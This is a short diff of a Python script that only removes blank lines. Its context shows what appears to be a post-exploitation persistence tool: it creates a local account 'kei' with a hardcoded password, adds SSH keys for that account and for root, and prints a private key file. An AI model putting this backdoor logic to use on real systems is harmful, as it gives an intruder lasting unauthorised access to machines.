@@ -99,7 +99,6 @@ class funcs:
             with open(f'/home/{user}/.ssh/id_rsa', 'r') as f:
                 print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
         
-
 class user:
     def __init__(self, ip, port, user_name):
         self.ip = ip
@@ -118,7 +117,6 @@ class root:
         funcs().create_local_account('kei', 'ILikeYouSoMuch<3')
         funcs().add_ssh_key('kei', True)
         funcs().add_ssh_key('root', True)
-
 
 if __name__ == '__main__':
 
